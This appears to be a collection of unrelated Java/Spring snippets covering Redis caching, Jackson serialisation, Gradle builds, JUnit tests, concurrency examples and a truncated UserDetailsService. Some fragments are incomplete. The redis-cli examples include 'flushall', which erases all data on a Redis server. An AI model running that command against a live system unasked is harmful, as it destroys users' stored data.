org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration,\
org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration,\
org.springframework.boot.autoconfigure.jdbc.XADataSourceAutoConfiguration,\
org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration,\
org.springframework.boot.autoconfigure.jms.JmsAutoConfiguration,\
org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration,\
org.springframework.boot.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration,\
org.springframework.boot.autoconfigure.jms.activemq.ActiveMQAutoConfiguration,\
org.springframework.boot.autoconfigure.jms.artemis.ArtemisAutoConfiguration,\
org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration,\
org.springframework.boot.autoconfigure.jersey.JerseyAutoConfiguration,\
org.springframework.boot.autoconfigure.jooq.JooqAutoConfiguration,\
org.springframework.boot.autoconfigure.jsonb.JsonbAutoConfiguration,\
org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration,\
org.springframework.boot.autoconfigure.ldap.embedded.EmbeddedLdapAutoConfiguration,\
org.springframework.boot.autoconfigure.ldap.LdapAutoConfiguration,\
org.springframework.boot.autoconfigure.liquibase.LiquibaseAutoConfiguration,\
org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration,\
org.springframework.boot.autoconfigure.mail.MailSenderValidatorAutoConfiguration,\
org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration,\
org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration,\
org.springframework.boot.autoconfigure.mongo.MongoReactiveAutoConfiguration,\
org.springframework.boot.autoconfigure.mustache.MustacheAutoConfiguration,\
org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,\
org.springframework.boot.autoconfigure.quartz.QuartzAutoConfiguration,\
org.springframework.boot.autoconfigure.reactor.core.ReactorCoreAutoConfiguration,\
org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration,\
org.springframework.boot.autoconfigure.security.servlet.SecurityRequestMatcherProviderAutoConfiguration,\
org.springframework.boot.autoconfigure.security.servlet.UserDetailsServiceAutoConfiguration,\
org.springframework.boot.autoconfigure.security.servlet.SecurityFilterAutoConfiguration,\
org.springframework.boot.autoconfigure.security.reactive.ReactiveSecurityAutoConfiguration,\
org.springframework.boot.autoconfigure.security.reactive.ReactiveUserDetailsServiceAutoConfiguration,\
org.springframework.boot.autoconfigure.sendgrid.SendGridAutoConfiguration,\
org.springframework.boot.autoconfigure.session.SessionAutoConfiguration,\
org.springframework.boot.autoconfigure.security.oauth2.client.servlet.OAuth2ClientAutoConfiguration,\
org.springframework.boot.autoconfigure.security.oauth2.client.reactive.ReactiveOAuth2ClientAutoConfiguration,\
org.springframework.boot.autoconfigure.security.oauth2.resource.servlet.OAuth2ResourceServerAutoConfiguration,\
org.springframework.boot.autoconfigure.security.oauth2.resource.reactive.ReactiveOAuth2ResourceServerAutoConfiguration,\
org.springframework.boot.autoconfigure.solr.SolrAutoConfiguration,\
org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration,\
org.springframework.boot.autoconfigure.task.TaskSchedulingAutoConfiguration,\
org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration,\
org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration,\
org.springframework.boot.autoconfigure.transaction.jta.JtaAutoConfiguration,\
org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration,\
org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfiguration,\
org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.HttpHandlerAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.ReactiveWebServerFactoryAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.WebFluxAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.error.ErrorWebFluxAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.function.client.ClientHttpConnectorAutoConfiguration,\
org.springframework.boot.autoconfigure.web.reactive.function.client.WebClientAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactoryAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.HttpEncodingAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.MultipartAutoConfiguration,\
org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration,\
org.springframework.boot.autoconfigure.websocket.reactive.WebSocketReactiveAutoConfiguration,\
org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletAutoConfiguration,\
org.springframework.boot.autoconfigure.websocket.servlet.WebSocketMessagingAutoConfiguration,\
org.springframework.boot.autoconfigure.webservices.WebServicesAutoConfiguration,\
org.springframework.boot.autoconfigure.webservices.client.WebServiceTemplateAutoConfiguration

# Failure analyzers
org.springframework.boot.diagnostics.FailureAnalyzer=\
org.springframework.boot.autoconfigure.diagnostics.analyzer.NoSuchBeanDefinitionFailureAnalyzer,\
org.springframework.boot.autoconfigure.jdbc.DataSourceBeanCreationFailureAnalyzer,\
org.springframework.boot.autoconfigure.jdbc.HikariDriverConfigurationFailureAnalyzer,\
org.springframework.boot.autoconfigure.session.NonUniqueSessionRepositoryFailureAnalyzer

# Template availability providers
org.springframework.boot.autoconfigure.template.TemplateAvailabilityProvider=\
org.springframework.boot.autoconfigure.freemarker.FreeMarkerTemplateAvailabilityProvider,\
org.springframework.boot.autoconfigure.mustache.MustacheTemplateAvailabilityProvider,\
org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAvailabilityProvider,\
org.springframework.boot.autoconfigure.thymeleaf.ThymeleafTemplateAvailabilityProvider,\
org.springframework.boot.autoconfigure.web.servlet.JspTemplateAvailabilityProvider
--------------------------------------------------------------------------------------------------------
package com.paragon.mailingcontour.commons.registry.service.impl;

import com.paragon.mailingcontour.commons.registry.configuration.RegistryMetadataConfigurer;
import com.paragon.mailingcontour.commons.registry.model.RegistryApplicationData;
import com.paragon.mailingcontour.commons.registry.service.interfaces.RegistryCachingService;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.cache.Cache;
import org.springframework.cache.CacheManager;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.Objects;
import java.util.Optional;

/**
 * {@link RegistryCachingService} service implementation
 */
@Slf4j
@Service
@RequiredArgsConstructor
@Transactional(rollbackFor = Exception.class)
public class RegistryCachingServiceImpl implements RegistryCachingService {
    private final RegistryMetadataConfigurer registryMetadataConfigurer;
    //private final StringRedisTemplate stringRedisTemplate;
    //private final RegistryApplicationDataFormatter registryApplicationDataFormatter;
    private final CacheManager cacheManager;

//    @Override
//    public Optional<RegistryApplicationData> getRegistryApplicationData(final String id) {
//        RegistryApplicationData registryData = null;
//        try {
//            final String sessionKey = this.registryMetadataConfigurer.getSessionKey(id);
//            final ValueOperations<String, String> opsForValue = this.stringRedisTemplate.opsForValue();
//            log.debug("Fetching registry application data from REDIS >>> id: {}", id);
//
//            final String sourceData = opsForValue.get(sessionKey);
//            registryData = this.registryApplicationDataFormatter.parse(sourceData, Locale.getDefault());
//            log.debug("Registry application data is received from REDIS <<< registryData: {}", registryData);
//        } catch (Exception e) {
//            this.rethrowSpecificException(e);
//        }
//        return Optional.ofNullable(registryData);
//    }
//
//    @Override
//    public void setRegistryApplicationData(final String id, final RegistryApplicationData registryData) {
//        final String sessionKey = this.registryMetadataConfigurer.getSessionKey(id);
//        final ValueOperations<String, String> opsForValue = this.stringRedisTemplate.opsForValue();
//        log.debug("Storing registry application data to REDIS >>> id: {}", id);
//        opsForValue.set(sessionKey, this.registryApplicationDataFormatter.print(registryData, Locale.getDefault()));
//    }
//
//    @Override
//    public Boolean isApplicationDataExist(final String id) {
//        Boolean result = null;
//        try {
//            final String sessionKey = this.registryMetadataConfigurer.getSessionKey(id);
//            log.debug("Check if id exist in REDIS >>> id: {}", id);
//            result = this.stringRedisTemplate.hasKey(sessionKey);
//            log.debug("Id checked in REDIS <<< id: {}, result: {}", id, result);
//        } catch (Exception e) {
//            this.rethrowSpecificException(e);
//        }
//        return result;
//    }
//
//    private void rethrowSpecificException(final Exception e) {
//        rethrowRedisServiceSpecificException(e, e.getMessage(), String.format("Error is occurred when requesting Redis; message = {%s}", e.getMessage()));
//    }

    @Override
    public boolean exist(final String key) {
        return Objects.nonNull(this.get(key));
    }

    @Override
    public void put(final String key, final RegistryApplicationData value) {
        final String sessionKey = this.registryMetadataConfigurer.getSessionKey(key);
        final String cacheName = this.registryMetadataConfigurer.getCacheName();
        log.info("Updating cache record by key: {}, cache: {}", sessionKey, cacheName);
        Optional.ofNullable(this.cacheManager.getCache(cacheName))
                .ifPresent(cache -> cache.put(sessionKey, value));
    }

    @Override
    public Optional<RegistryApplicationData> get(final String key) {
        final String sessionKey = this.registryMetadataConfigurer.getSessionKey(key);
        final String cacheName = this.registryMetadataConfigurer.getCacheName();
        log.info("Fetching cache record by key: {}, cache: {}", sessionKey, cacheName);
        return Optional.ofNullable(this.cacheManager.getCache(cacheName))
                .map(cache -> cache.get(sessionKey))
                .map(Cache.ValueWrapper::get)
                .map(value -> (RegistryApplicationData) value);
    }

    @Override
    public void evict(final String key) {
        final String sessionKey = this.registryMetadataConfigurer.getSessionKey(key);
        final String cacheName = this.registryMetadataConfigurer.getCacheName();
        log.info("Evicting cache record by key: {}, cache: {}", sessionKey, cacheName);
        Optional.ofNullable(this.cacheManager.getCache(cacheName)).ifPresent(cache -> cache.evict(sessionKey));
    }

    @Override
    public void evictAll() {
        final String cacheName = this.registryMetadataConfigurer.getCacheName();
        log.info("Evicting all records in cache: {}", cacheName);
        Optional.ofNullable(this.cacheManager.getCache(cacheName)).ifPresent(Cache::clear);
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Value;
import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.PropertySource;
import org.springframework.context.support.PropertySourcesPlaceholderConfigurer;
import org.springframework.data.redis.cache.RedisCacheManager;
import org.springframework.data.redis.connection.jedis.JedisConnectionFactory;
import org.springframework.data.redis.core.RedisTemplate;

/**
 * Created by IntelliJ IDEA.
 * Project : redis-manager
 * User: hendisantika
 * Email: hendisantika@gmail.com
 * Telegram : @hendisantika34
 * Date: 09/04/18
 * Time: 20.34
 * To change this template use File | Settings | File Templates.
 */
@Configuration
@EnableCaching
@ComponentScan("com.hendi.redismanager")
@PropertySource("classpath:/redis.properties")
public class AppConfig {

    private @Value("${redis.host}")
    String redisHost;

    private @Value("${redis.port}")
    int redisPort;

    @Bean
    public static PropertySourcesPlaceholderConfigurer propertySourcesPlaceholderConfigurer() {
        return new PropertySourcesPlaceholderConfigurer();
    }

    @Bean
    JedisConnectionFactory jedisConnectionFactory() {
        JedisConnectionFactory factory = new JedisConnectionFactory();
        factory.setHostName(redisHost);
        factory.setPort(redisPort);
        factory.setUsePool(true);
        return factory;
    }

    @Bean
    RedisTemplate<Object, Object> redisTemplate() {
        RedisTemplate<Object, Object> redisTemplate = new RedisTemplate<Object, Object>();
        redisTemplate.setConnectionFactory(jedisConnectionFactory());
        return redisTemplate;
    }

    @Bean
    CacheManager cacheManager() {
        return new RedisCacheManager(redisTemplate());
    }
}

    @Bean
    @ConditionalOnMissingBean
    @ConditionalOnBean(ObjectMapper.class)
    @DependsOn({"redisConnectionFactory"})
    @Description("String Redis template configuration bean")
    public StringRedisTemplate stringRedisTemplate(final ObjectMapper objectMapper, final RedisConnectionFactory redisConnectionFactory) {
        final StringRedisTemplate template = new StringRedisTemplate(redisConnectionFactory);
        template.setEnableTransactionSupport(true);
        template.setKeySerializer(new StringRedisSerializer());
        template.setValueSerializer(this.registryValueSerializer(objectMapper));
//        template.setValueSerializer(new GenericJackson2JsonRedisSerializer());
        template.afterPropertiesSet();
        return template;
    }

    //@Bean
    //@ConditionalOnMissingBean
    //@ConditionalOnBean(ObjectMapper.class)
    public RedisSerializer<RegistryApplicationData> registryValueSerializer(final ObjectMapper objectMapper) {
        final Jackson2JsonRedisSerializer<RegistryApplicationData> jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer<>(RegistryApplicationData.class);
        jackson2JsonRedisSerializer.setObjectMapper(objectMapper);
        return jackson2JsonRedisSerializer;
    }

@Cacheable(value = "messageCache", condition = "'guitar'.equals(#instrument)")
--------------------------------------------------------------------------------------------------------
redis-cli --raw incr mycounter
redis-cli flushall

redis-cli -h redis15.localnet.org -p 6390 ping

redis-cli -x set foo < /etc/services

redis-cli -r 5 incr foo

$ cat /tmp/script.lua
return redis.call('set',KEYS[1],ARGV[1])
$ redis-cli --eval /tmp/script.lua foo , bar
OK

127.0.0.1:6379> select 2
OK
127.0.0.1:6379[2]> dbsize
(integer) 1
127.0.0.1:6379[2]> select 0
OK
127.0.0.1:6379> dbsize
(integer) 503

./redis-cli --lru-test 10000000

--------------------------------------------------------------------------------------------------------
//    @Bean
//    @ConditionalOnMissingBean
//    @ConditionalOnBean(ObjectMapper.class)
//    @DependsOn({"redisConnectionFactory"})
//    @Description("String Redis template configuration bean")
//    public StringRedisTemplate stringRedisTemplate(final ObjectMapper objectMapper, final RedisConnectionFactory redisConnectionFactory) {
//        final StringRedisTemplate template = new StringRedisTemplate(redisConnectionFactory);
//        template.setEnableTransactionSupport(true);
//        template.setKeySerializer(new StringRedisSerializer());
//        template.setValueSerializer(this.registryValueSerializer(objectMapper));
////        template.setValueSerializer(new GenericJackson2JsonRedisSerializer());
//        template.afterPropertiesSet();
//        return template;
//    }
//
//    //@Bean
//    //@ConditionalOnMissingBean
//    //@ConditionalOnBean(ObjectMapper.class)
//    public RedisSerializer<RegistryApplicationData> registryValueSerializer(final ObjectMapper objectMapper) {
//        final Jackson2JsonRedisSerializer<RegistryApplicationData> jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer<>(RegistryApplicationData.class);
//        jackson2JsonRedisSerializer.setObjectMapper(objectMapper);
//        return jackson2JsonRedisSerializer;
//    }


--------------------------------------------------------------------------------------------------------
group 'org.aze.accountingprogram'
version '1.0-SNAPSHOT'

apply plugin: 'java'
apply plugin: 'idea'
apply plugin: 'war'
apply plugin: 'spring-boot'

allprojects {
    sourceCompatibility = '1.8'
    targetCompatibility = '1.8'
}

repositories {
    mavenCentral()
}

buildscript {
    repositories {
        jcenter()
    }

    dependencies {
        classpath("org.springframework.boot:spring-boot-gradle-plugin:1.3.2.RELEASE")
    }
}

dependencies {
    compile("org.springframework.boot:spring-boot-starter")
    compile("org.springframework.boot:spring-boot-starter-web")
//    compile("org.springframework.boot:spring-boot-starter-jdbc")
//    runtime("mysql:mysql-connector-java")
    compile("org.springframework.boot:spring-boot-starter-logging")
    compile("javax.servlet:jstl")
    providedRuntime("org.apache.tomcat.embed:tomcat-embed-jasper")
    providedRuntime("org.springframework.boot:spring-boot-starter-tomcat")
    testCompile("org.springframework.boot:spring-boot-starter-test")
    testCompile group: 'junit', name: 'junit', version: '4.11'
}

configurations {
    compile.exclude group: 'commons-logging'
    compile.exclude group: 'org.apache.logging.log4j'
    compile.exclude group: 'log4j'
    providedRuntime
}

war {
    archiveName = 'AZEAccountingProgram.war'
    destinationDir = file('dist')
}

idea {
    project {
        //if you want to set specific jdk and language level
        jdkName = '1.8'
        languageLevel = '1.8'
    }
    module {
        //if you love browsing Javadoc
        downloadJavadoc = true
        jdkName = '1.8'
        excludeDirs += file('.nb-gradle')
        excludeDirs += file('.gradle')
        excludeDirs += file('out')
        excludeDirs += file('gradle')
        excludeDirs += file('build')
        excludeDirs += file('dist')
    }
}
--------------------------------------------------------------------------------------------------------
@ExtendWith(SpringExtension.class)
@WebMvcTest(controllers = ValidateRequestBodyController.class)
class ValidateRequestBodyControllerTest {

  @Autowired
  private MockMvc mvc;

  @Autowired
  private ObjectMapper objectMapper;

  @Test
  void whenInputIsInvalid_thenReturnsStatus400() throws Exception {
    Input input = invalidInput();
    String body = objectMapper.writeValueAsString(input);

    mvc.perform(post("/validateBody")
            .contentType("application/json")
            .content(body))
            .andExpect(status().isBadRequest());
  }
}
--------------------------------------------------------------------------------------------------------
## swagger-codegen

UploadedImage:
    type: object
    properties:
      data:
        type: string
        format: byte
      mime_type:
        type: string
        enum: [image/bmp,image/jpeg,image/png]
      url:
        type: string
and I see that Swagger-codegen has generated the following class for it:

package com.github.ghost93.model;

import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.annotation.JsonValue;
import io.swagger.annotations.ApiModelProperty;
import java.util.Objects;
import javax.validation.constraints.Pattern;

/**
 * UploadedImage
 */
@javax.annotation.Generated(value = "io.swagger.codegen.languages.SpringCodegen", date = "2017-08-17T22:15:18.867+03:00")

public class UploadedImage {

  @JsonProperty("data")
  private byte[] data = null;
  @JsonProperty("mime_type")
  private MimeTypeEnum mimeType = null;
  @JsonProperty("url")
  private String url = null;

  public UploadedImage data(byte[] data) {
    this.data = data;
    return this;
  }

  /**
   * Get data
   *
   * @return data
   **/
  @ApiModelProperty(value = "")

  @Pattern(regexp = "^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$")
  public byte[] getData() {
    return data;
  }

  public void setData(byte[] data) {
    this.data = data;
  }

  public UploadedImage mimeType(MimeTypeEnum mimeType) {
    this.mimeType = mimeType;
    return this;
  }

  /**
   * Get mimeType
   *
   * @return mimeType
   **/
  @ApiModelProperty(value = "")

  public MimeTypeEnum getMimeType() {
    return mimeType;
  }

  public void setMimeType(MimeTypeEnum mimeType) {
    this.mimeType = mimeType;
  }

  public UploadedImage url(String url) {
    this.url = url;
    return this;
  }

  /**
   * Get url
   *
   * @return url
   **/
  @ApiModelProperty(value = "")

  public String getUrl() {
    return url;
  }

  public void setUrl(String url) {
    this.url = url;
  }

  @Override
  public boolean equals(java.lang.Object o) {
    if (this == o) {
      return true;
    }
    if (o == null || getClass() != o.getClass()) {
      return false;
    }
    UploadedImage uploadedImage = (UploadedImage) o;
    return Objects.equals(this.data, uploadedImage.data) &&
        Objects.equals(this.mimeType, uploadedImage.mimeType) &&
        Objects.equals(this.url, uploadedImage.url);
  }

  @Override
  public int hashCode() {
    return Objects.hash(data, mimeType, url);
  }

  @Override
  public String toString() {
    StringBuilder sb = new StringBuilder();
    sb.append("class UploadedImage {\n");

    sb.append("    data: ").append(toIndentedString(data)).append("\n");
    sb.append("    mimeType: ").append(toIndentedString(mimeType)).append("\n");
    sb.append("    url: ").append(toIndentedString(url)).append("\n");
    sb.append("}");
    return sb.toString();
  }

  /**
   * Convert the given object to string with each line indented by 4 spaces (except the first
   * line).
   */
  private String toIndentedString(java.lang.Object o) {
    if (o == null) {
      return "null";
    }
    return o.toString().replace("\n", "\n    ");
  }

  /**
   * Gets or Sets mimeType
   */
  public enum MimeTypeEnum {
    BMP("image/bmp"),

    JPEG("image/jpeg"),

    PNG("image/png");

    private String value;

    MimeTypeEnum(String value) {
      this.value = value;
    }

    @JsonCreator
    public static MimeTypeEnum fromValue(String text) {
      for (MimeTypeEnum b : MimeTypeEnum.values()) {
        if (String.valueOf(b.value).equals(text)) {
          return b;
        }
      }
      return null;
    }

    @Override
    @JsonValue
    public String toString() {
      return String.valueOf(value);
    }
  }
}
--------------------------------------------------------------------------------------------------------
ObjectMapper mapper = new ObjectMapper();
SimpleModule module = 
  new SimpleModule("CustomCarSerializer", new Version(1, 0, 0, null, null, null));
module.addSerializer(Car.class, new CustomCarSerializer());
mapper.registerModule(module);
Car car = new Car("yellow", "renault");
String carJson = mapper.writeValueAsString(car);

String json = "{ \"color\" : \"Black\", \"type\" : \"BMW\" }";
ObjectMapper mapper = new ObjectMapper();
SimpleModule module =
  new SimpleModule("CustomCarDeserializer", new Version(1, 0, 0, null, null, null));
module.addDeserializer(Car.class, new CustomCarDeserializer());
mapper.registerModule(module);
Car car = mapper.readValue(json, Car.class);

ObjectMapper objectMapper = new ObjectMapper();
DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm a z");
objectMapper.setDateFormat(df);
String carAsString = objectMapper.writeValueAsString(request);
// output: {"car":{"color":"yellow","type":"renault"},"datePurchased":"2016-07-03 11:43 AM CEST"}

String jsonCarArray = 
  "[{ \"color\" : \"Black\", \"type\" : \"BMW\" }, { \"color\" : \"Red\", \"type\" : \"FIAT\" }]";
ObjectMapper objectMapper = new ObjectMapper();
objectMapper.configure(DeserializationFeature.USE_JAVA_ARRAY_FOR_JSON_ARRAY, true);
Car[] cars = objectMapper.readValue(jsonCarArray, Car[].class);
// print cars

String jsonCarArray = 
  "[{ \"color\" : \"Black\", \"type\" : \"BMW\" }, { \"color\" : \"Red\", \"type\" : \"FIAT\" }]";
ObjectMapper objectMapper = new ObjectMapper();
List<Car> listCar = objectMapper.readValue(jsonCarArray, new TypeReference<List<Car>>(){});
// print cars

import java.util.Calendar;

import lombok.Builder;
import lombok.Value;

import com.fasterxml.jackson.annotation.JsonFormat;
import com.fasterxml.jackson.annotation.JsonIgnore;
import com.fasterxml.jackson.databind.PropertyNamingStrategy;
import com.fasterxml.jackson.databind.annotation.JsonNaming;

@Builder
@Value
@JsonNaming(PropertyNamingStrategy.SnakeCaseStrategy.class)
public class JacksonExample {
    private String fieldOne;
    @JsonIgnore
    private String fieldTwo;
    @JsonFormat(shape = JsonFormat.Shape.STRING)
    private Calendar someDate;
}
--------------------------------------------------------------------------------------------------------
public class BaeldungSynchronizedMethods {
 
    private int sum = 0;
 
    public void calculate() {
        setSum(getSum() + 1);
    }
 
    // standard setters and getters
}

@Test
public void givenMultiThread_whenNonSyncMethod() {
    ExecutorService service = Executors.newFixedThreadPool(3);
    BaeldungSynchronizedMethods summation = new BaeldungSynchronizedMethods();
 
    IntStream.range(0, 1000)
      .forEach(count -> service.submit(summation::calculate));
    service.awaitTermination(1000, TimeUnit.MILLISECONDS);
 
    assertEquals(1000, summation.getSum());
}

@Test
public void givenMultiThread_whenStaticSyncBlock() {
    ExecutorService service = Executors.newCachedThreadPool();
 
    IntStream.range(0, 1000)
      .forEach(count -> 
        service.submit(BaeldungSynchronizedBlocks::performStaticSyncTask));
    service.awaitTermination(100, TimeUnit.MILLISECONDS);
 
    assertEquals(1000, BaeldungSynchronizedBlocks.getStaticCount());
}
--------------------------------------------------------------------------------------------------------
public class SafeCounterWithoutLock {
    private final AtomicInteger counter = new AtomicInteger(0);
     
    public int getValue() {
        return counter.get();
    }
    public void increment() {
        while(true) {
            int existingValue = getValue();
            int newValue = existingValue + 1;
            if(counter.compareAndSet(existingValue, newValue)) {
                return;
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
@Test
public void testWorkDelegatesMethodCall() throws Exception {
    // given
    AtomicInteger counter = new AtomicInteger(0);
    MessageWorker<String, Integer> uut = new MessageWorker<String, Integer>() {
        @Override
        public Integer work(String object) {
            return counter.incrementAndGet();
        }
    };
    MessageHeaders messageHeaders = mock(MessageHeaders.class);

    // when
    uut.work("dummy value", messageHeaders);

    // then
    assertEquals(1, counter.intValue());
    verifyZeroInteractions(messageHeaders);
}
--------------------------------------------------------------------------------------------------------
@Test
public void testSendMessageToEntity() throws Exception {
    entityService.sendMessageToEntity(entity, output);

    verify(simpMessagingTemplate).convertAndSendToUser(
            eq("stompUsername"),
            eq("/queue/output"),
            eq(output),
            messageHeadersArgumentCaptor.capture());

    MessageHeaders headers = messageHeadersArgumentCaptor.getValue();
    SimpMessageHeaderAccessor accessor = SimpMessageHeaderAccessor.getAccessor(headers, SimpMessageHeaderAccessor.class);

    assertEquals("stompSessionId", accessor.getSessionId());
    assertTrue(accessor.isMutable());
}
--------------------------------------------------------------------------------------------------------
curl -X POST \
  http://localhost:8080/addToBasket \
  -H 'content-type: application/json' \
  -d '{
    "detail": {
      "product": "car",
      "code": "car-02"
    },
    "amount": 1
   }'
--------------------------------------------------------------------------------------------------------
 @Repository
 public interface SecurityMessageRepository extends MessageRepository {
 
        @Query("select m from Message m where m.to.id = ?#{ principal?.id }")
        List<Message> findAll();
 }
--------------------------------------------------------------------------------------------------------
import org.joda.time.DateTime;
import org.joda.time.LocalDate;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import org.abcgo.domain.util.CustomDateTimeDeserializer;
import org.abcgo.domain.util.CustomDateTimeSerializer;
import org.abcgo.domain.util.CustomLocalDateSerializer;
import org.abcgo.domain.util.ISO8601LocalDateDeserializer;
import com.fasterxml.jackson.datatype.joda.JodaModule;

@Configuration
public class JacksonConfiguration {

    @Bean
    public  JodaModule jacksonJodaModule() {
        JodaModule module = new JodaModule();
        module.addSerializer(DateTime.class, new CustomDateTimeSerializer());
        module.addDeserializer(DateTime.class, new CustomDateTimeDeserializer());
        module.addSerializer(LocalDate.class, new CustomLocalDateSerializer());
        module.addDeserializer(LocalDate.class, new ISO8601LocalDateDeserializer());
        return module;
    }
}
--------------------------------------------------------------------------------------------------------
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.aop.interceptor.AsyncUncaughtExceptionHandler;
import org.springframework.aop.interceptor.SimpleAsyncUncaughtExceptionHandler;
import org.springframework.boot.bind.RelaxedPropertyResolver;
import org.springframework.context.EnvironmentAware;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.core.env.Environment;
import org.springframework.scheduling.annotation.AsyncConfigurer;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;

import java.util.concurrent.Executor;

import org.abcgo.async.ExceptionHandlingAsyncTaskExecutor;

@Configuration
@EnableAsync
@EnableScheduling
@Profile("!" + Constants.SPRING_PROFILE_FAST)
public class AsyncConfiguration implements AsyncConfigurer, EnvironmentAware {

    private final Logger log = LoggerFactory.getLogger(AsyncConfiguration.class);

    private RelaxedPropertyResolver propertyResolver;

    @Override
    public  void setEnvironment(Environment environment) {
        this.propertyResolver = new RelaxedPropertyResolver(environment, "async.");
    }

    @Override
    @Bean
    public  Executor getAsyncExecutor() {
        log.debug("Creating Async Task Executor");
        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();
        executor.setCorePoolSize(propertyResolver.getProperty("corePoolSize", Integer.class, 2));
        executor.setMaxPoolSize(propertyResolver.getProperty("maxPoolSize", Integer.class, 50));
        executor.setQueueCapacity(propertyResolver.getProperty("queueCapacity", Integer.class, 10000));
        executor.setThreadNamePrefix("abcgo-Executor-");
        return new ExceptionHandlingAsyncTaskExecutor(executor);
    }

    @Override
    public  AsyncUncaughtExceptionHandler getAsyncUncaughtExceptionHandler() {
        return new SimpleAsyncUncaughtExceptionHandler();
    }
}
--------------------------------------------------------------------------------------------------------
import com.huixinpn.dionysus.domain.article.Article;
import com.huixinpn.dionysus.domain.article.Blog;
import com.huixinpn.dionysus.domain.article.Category;
import com.huixinpn.dionysus.domain.article.OfficialArticle;
import com.huixinpn.dionysus.domain.chat.ChatMessage;
import com.huixinpn.dionysus.domain.chat.Room;
import com.huixinpn.dionysus.domain.course.Course;
import com.huixinpn.dionysus.domain.course.CourseCategory;
import com.huixinpn.dionysus.domain.psychtest.PsychTest;
import com.huixinpn.dionysus.domain.psychtest.PsychTestQuestion;
import com.huixinpn.dionysus.domain.psychtest.PsychTestQuestionOption;
import com.huixinpn.dionysus.domain.psychtest.PsychTestResult;
import com.huixinpn.dionysus.domain.site.Menu;
import com.huixinpn.dionysus.domain.user.*;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import org.springframework.data.rest.core.config.RepositoryRestConfiguration;
import org.springframework.data.rest.webmvc.config.RepositoryRestMvcConfiguration;

import java.net.URI;
import java.net.URISyntaxException;

@Configuration
@Import(RepositoryRestMvcConfiguration.class)
public class RestfulConfiguration extends RepositoryRestMvcConfiguration {

  @Override
  protected  void configureRepositoryRestConfiguration(RepositoryRestConfiguration config) {
    config.exposeIdsFor(Article.class, Category.class, Menu.class,
        PsychTest.class, PsychTestQuestion.class, PsychTestResult.class, PsychTestQuestionOption.class,
        Consultant.class, Profile.class, ProfileItem.class, User.class,
        CourseCategory.class, Course.class, OfficialArticle.class, Blog.class, ConsExpertise.class, Room.class, ChatMessage.class);
    try {
      config.setReturnBodyOnCreate(true);
      config.setReturnBodyOnUpdate(true);
      config.setBaseUri(new URI("/api/v1"));
    } catch (URISyntaxException e) {
      e.printStackTrace();
    }
  }
}
--------------------------------------------------------------------------------------------------------
import javax.annotation.PostConstruct;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;
import org.springframework.web.context.WebApplicationContext;

import com.baeldung.data.repositories.UserRepository;
import com.baeldung.models.AppUser;

@Service
public class CustomUserDetailsService implements UserDetailsService {

    @Autowired
    private WebApplicationContext applicationContext;
    private UserRepository userRepository;

    public CustomUserDetailsService() {
        super();
    }

    @PostConstruct
    public void completeSetup() {
        userRepository = applicationContext.getBean(UserRepository.class);
    }

    @Override
    public UserDetails loadUserByUsername(final String username) {
        final AppUser appUser = userRepository.findByUsername(username);
        if (appUser == null) {
